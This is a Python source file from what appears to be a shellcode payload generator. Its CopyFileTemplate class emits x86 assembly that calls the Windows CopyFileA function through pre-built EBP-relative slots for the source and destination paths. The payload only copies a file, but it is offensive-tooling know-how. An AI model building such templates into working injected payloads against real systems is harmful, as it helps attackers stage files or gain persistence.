"""Copy-file payload template.

Requires: CopyFileA
Strings: src_path, dst_path (mov method, pre-built at slots)
"""
from __future__ import annotations

from .base import PayloadTemplate, TemplateConfig


class CopyFileTemplate(PayloadTemplate):
    REQUIRED_FUNCTIONS = ("CopyFileA",)
    REQUIRED_VARIABLES = ()

    def emit(self, layout, config: TemplateConfig) -> str:
        copyfile = layout.slot("CopyFileA").ebp_ref

        try:
            src = layout.slot("src_path").ebp_ref
            dst = layout.slot("dst_path").ebp_ref
        except KeyError as e:
            raise ValueError(
                f"CopyFileTemplate requires 'src_path' and 'dst_path' string slots. "
                f"Missing: {e}"
            ) from e

        return "\n".join([
            "; ── Copy File Payload ───────────────────────────────────────────",
            "",
            "    ; CopyFileA(&src, &dst, bFailIfExists=FALSE)",
            f"    lea  eax, {src}",
            f"    lea  ebx, {dst}",
            "    xor  ecx, ecx             ; bFailIfExists = FALSE",
            "    push ecx",
            "    push ebx                  ; lpNewFileName",
            "    push eax                  ; lpExistingFileName",
            f"    call dword ptr {copyfile}",
            "",
        ])
